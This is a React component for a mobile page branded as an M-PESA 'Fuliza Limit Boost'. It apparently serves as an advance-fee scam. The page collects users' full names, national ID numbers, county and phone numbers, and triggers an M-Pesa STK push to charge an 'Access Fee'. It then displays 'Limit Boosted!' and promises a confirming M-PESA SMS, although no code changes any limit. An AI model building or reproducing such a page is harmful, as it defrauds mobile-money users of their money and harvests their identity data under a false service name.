import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FaCheckCircle, FaTimesCircle, FaSpinner } from 'react-icons/fa';

function Application() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [loan, setLoan] = useState(null);

  const [fullName, setFullName] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [county, setCounty] = useState('');
  const [currentLimit, setCurrentLimit] = useState('');
  const [paymentPhone, setPaymentPhone] = useState('');

  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [showFailedModal, setShowFailedModal] = useState(false);
  const [applicationData, setApplicationData] = useState(null);

  const counties = [
    'Baringo', 'Bomet', 'Bungoma', 'Busia', 'Elgeyo-Marakwet',
    'Embu', 'Garissa', 'Homa Bay', 'Isiolo', 'Kajiado',
    'Kakamega', 'Kericho', 'Kiambu', 'Kilifi', 'Kirinyaga',
    'Kisii', 'Kisumu', 'Kitui', 'Kwale', 'Laikipia',
    'Lamu', 'Machakos', 'Makueni', 'Mandera', 'Marsabit',
    'Meru', 'Migori', 'Mombasa', 'Murang\'a', 'Nairobi',
    'Nakuru', 'Nandi', 'Narok', 'Nyamira', 'Nyandarua',
    'Nyeri', 'Samburu', 'Siaya', 'Taita-Taveta', 'Tana River',
    'Tharaka-Nithi', 'Trans Nzoia', 'Turkana', 'Uasin Gishu',
    'Vihiga', 'Wajir', 'West Pokot'
  ];

  useEffect(() => {
    const savedPhone = localStorage.getItem('userPhone');
    const savedLoan = localStorage.getItem('selectedLoan');

    if (!savedPhone || !savedLoan) {
      navigate('/');
      return;
    }

    setPhone(savedPhone);
    setLoan(JSON.parse(savedLoan));
  }, [navigate]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!paymentPhone || paymentPhone.length < 10) {
      alert('Please enter a valid M-Pesa phone number');
      return;
    }

    const data = {
      fullName,
      idNumber,
      county,
      currentLimit,
      paymentPhone,
      verifiedPhone: phone,
      loan: loan,
      submittedAt: new Date().toISOString(),
    };

    localStorage.setItem('applicationData', JSON.stringify(data));
    localStorage.setItem('userPhone', phone);
    localStorage.setItem('selectedLoan', JSON.stringify(loan));

    setApplicationData(data);
    setIsProcessing(true);

    try {
      const reference = `mml_${Date.now()}`;

      const response = await fetch('/api/paylor-stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: paymentPhone,
          amount: loan.fee,
          reference: reference,
          description: `Access Fee`,
        }),
      });

      const result = await response.json();

      if (result.success) {
        pollTransactionStatus(result.transactionId || reference);
      } else {
        setIsProcessing(false);
        setShowFailedModal(true);
        console.error(result.error);
      }
    } catch (error) {
      console.error('STK Push error:', error);
      setIsProcessing(false);
      setShowFailedModal(true);
    }
  };

  const pollTransactionStatus = (reference) => {
    let attempts = 0;
    const maxAttempts = 20;

    const interval = setInterval(async () => {
      attempts++;

      try {
        const res = await fetch(`/api/paylor-transaction-status?reference=${reference}`);
        const data = await res.json();

        if (!data.success) return;

        const status = (data.status || '').toUpperCase();

        if (status === 'COMPLETED' || status === 'CONFIRMED' || status === 'SUCCESS') {
          clearInterval(interval);
          setIsProcessing(false);
          setShowSuccessModal(true);
        } else if (status === 'FAILED' || status === 'CANCELLED' || status === 'DECLINED') {
          clearInterval(interval);
          setIsProcessing(false);
          setShowFailedModal(true);
        }

        if (attempts >= maxAttempts) {
          clearInterval(interval);
          setIsProcessing(false);
          setShowFailedModal(true);
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 3000);
  };

  if (!loan) return null;

  return (
    <div className="min-h-screen bg-gray-50 font-sans flex justify-center">
      <div className="w-full max-w-md bg-white min-h-screen shadow-xl relative">

        <div className="bg-mpesa-500 px-5 py-6 text-white">
          <h1 className="text-xl font-bold">Fuliza Limit Boost</h1>
          <p className="text-sm text-mpesa-100 mt-1">Unlock your new Fuliza M-PESA limit</p>
        </div>

        <div className="p-5">
          <div className="bg-mpesa-50 border border-mpesa-100 rounded-2xl p-5 mb-6">
            <p className="text-xs text-mpesa-700 font-medium mb-1">New Fuliza Limit</p>
            <h2 className="text-2xl font-bold text-dark-900">{loan.name}</h2>
            <p className="text-lg font-semibold text-mpesa-600 mt-1">
              KSh {loan.amount.toLocaleString()}
            </p>
            <p className="text-sm text-gray-500 mt-2">
              Access Fee: <span className="font-medium text-dark-900">KSh {loan.fee.toLocaleString()}</span>
            </p>
            <p className="text-sm text-gray-500 mt-1">
              Transaction Cost: <span className="font-medium text-dark-900">KSh 0</span>
            </p>
            <p className="text-sm text-gray-500 mt-1">
              Verified Contact: <span className="font-medium text-dark-900">{phone}</span>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">

            <div>
              <label className="block text-xs font-medium text-gray-600 mb-1.5">
                Full Names (as on ID)
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="Enter full names as on national ID"
                required
                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                style={{ borderRadius: '2px' }}
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-gray-600 mb-1.5">
                ID Number
              </label>
              <input
                type="text"
                value={idNumber}
                onChange={(e) => setIdNumber(e.target.value)}
                placeholder="Enter your national ID number"
                required
                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                style={{ borderRadius: '2px' }}
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-gray-600 mb-1.5">
                County
              </label>
              <select
                value={county}
                onChange={(e) => setCounty(e.target.value)}
                required
                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500 bg-white"
                style={{ borderRadius: '2px' }}
              >
                <option value="">Select your county</option>
                {counties.map((item) => (
                  <option key={item} value={item}>
                    {item}
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block text-xs font-medium text-gray-600 mb-1.5">
                Current Fuliza Limit
              </label>
              <input
                type="number"
                inputMode="numeric"
                min="0"
                value={currentLimit}
                onChange={(e) => setCurrentLimit(e.target.value)}
                placeholder="Enter current limit"
                required
                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                style={{ borderRadius: '2px' }}
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-gray-600 mb-1.5">
                Phone Number (to pay Access Fee)
              </label>
              <input
                type="tel"
                value={paymentPhone}
                onChange={(e) => setPaymentPhone(e.target.value)}
                placeholder="07XX XXX XXX"
                required
                className="w-full border border-gray-200 px-4 py-3 text-sm focus:outline-none focus:border-mpesa-500"
                style={{ borderRadius: '2px' }}
              />
            </div>

            <p className="text-xs text-gray-500 leading-relaxed">
              To use your new Fuliza limit, transact normally on M-PESA even with insufficient funds and accept the Fuliza request at the end of the transaction.
            </p>

            <button
              type="submit"
              disabled={isProcessing}
              className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm mt-4 mb-12 disabled:opacity-70"
              style={{ borderRadius: '2px' }}
            >
              {isProcessing
                ? 'Processing Payment...'
                : `Pay KSh ${loan.fee.toLocaleString()} & Boost Limit`}
            </button>
          </form>
        </div>

        {isProcessing && (
          <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center">
            <div className="bg-white rounded-2xl p-8 flex flex-col items-center max-w-xs w-full mx-4">
              <FaSpinner className="text-4xl text-mpesa-500 animate-spin mb-4" />
              <p className="text-sm font-semibold text-dark-900">Processing Payment</p>
              <p className="mt-2 text-xs text-gray-500 text-center">
                STK Push sent. Please check your phone and enter your M-Pesa PIN to unlock your new Fuliza limit.
              </p>
            </div>
          </div>
        )}

        {showSuccessModal && applicationData && (
          <div className="fixed inset-0 bg-black/60 z-50 flex items-end sm:items-center justify-center">
            <div className="bg-white w-full max-w-md rounded-t-3xl sm:rounded-2xl overflow-hidden">

              <div className="bg-mpesa-500 px-6 pt-8 pb-6 text-center text-white">
                <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4">
                  <FaCheckCircle className="text-white text-4xl" />
                </div>
                <h2 className="text-2xl font-bold">Limit Boosted!</h2>
                <p className="text-mpesa-100 text-sm mt-1">
                  Your Fuliza M-PESA limit has been updated
                </p>
              </div>

              <div className="px-6 py-6 space-y-5 max-h-[60vh] overflow-y-auto">

                <div className="bg-mpesa-50 rounded-xl p-4">
                  <p className="text-xs text-mpesa-700 font-medium mb-1">New Fuliza Limit</p>
                  <div className="flex justify-between items-end">
                    <div>
                      <h3 className="text-xl font-bold text-dark-900">{applicationData.loan.name}</h3>
                      <p className="text-sm text-gray-500">Access Fee Paid • Transaction Cost KSh 0</p>
                    </div>
                    <div className="text-right">
                      <p className="text-xl font-bold text-mpesa-600">
                        KSh {applicationData.loan.amount.toLocaleString()}
                      </p>
                      <p className="text-xs text-gray-500">
                        Fee: KSh {applicationData.loan.fee.toLocaleString()}
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-white border border-gray-100 rounded-xl p-4 text-sm text-gray-700 leading-relaxed">
                  Dear {applicationData.fullName.split(' ')[0] || 'Customer'}, your Fuliza M-PESA limit is Ksh {applicationData.loan.amount.toLocaleString()}. Transaction Cost Ksh 0.
                </div>

                <div className="space-y-3">
                  <h4 className="text-sm font-semibold text-dark-900 border-b border-gray-100 pb-2">
                    Boost Details
                  </h4>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Full Name</span>
                    <span className="font-medium text-dark-900 text-right max-w-[60%]">
                      {applicationData.fullName}
                    </span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">ID Number</span>
                    <span className="font-medium text-dark-900">{applicationData.idNumber}</span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">County</span>
                    <span className="font-medium text-dark-900">{applicationData.county}</span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Current Limit</span>
                    <span className="font-medium text-dark-900">
                      KSh {Number(applicationData.currentLimit).toLocaleString()}
                    </span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">New Limit</span>
                    <span className="font-medium text-mpesa-600">
                      KSh {applicationData.loan.amount.toLocaleString()}
                    </span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Verified Phone</span>
                    <span className="font-medium text-dark-900">{applicationData.verifiedPhone}</span>
                  </div>

                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Payment Phone</span>
                    <span className="font-medium text-dark-900">{applicationData.paymentPhone}</span>
                  </div>
                </div>

                <div className="bg-yellow-50 border border-yellow-100 rounded-xl p-3">
                  <p className="text-xs text-yellow-800 leading-relaxed">
                    You will receive an M-PESA SMS confirming your new Fuliza limit. Transact normally even with insufficient funds and accept the Fuliza request at the end of the transaction.
                  </p>
                </div>
              </div>

              <div className="px-6 pb-6">
                <button
                  onClick={() => {
                    setShowSuccessModal(false);
                    navigate('/');
                  }}
                  className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm"
                  style={{ borderRadius: '2px' }}
                >
                  Back to Home
                </button>
              </div>
            </div>
          </div>
        )}

        {showFailedModal && (
          <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center px-4">
            <div className="bg-white w-full max-w-sm rounded-2xl p-8 text-center">
              <FaTimesCircle className="text-5xl text-red-500 mx-auto mb-5" />
              <h3 className="text-xl font-bold text-dark-900 mb-2">Payment Failed</h3>
              <p className="text-sm text-gray-600 mb-6">
                The access fee payment was cancelled or failed. Please try again to unlock your new Fuliza limit.
              </p>
              <button
                onClick={() => setShowFailedModal(false)}
                className="w-full bg-mpesa-500 active:bg-mpesa-600 text-white font-semibold py-3.5 text-sm"
                style={{ borderRadius: '2px' }}
              >
                Try Again
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default Application;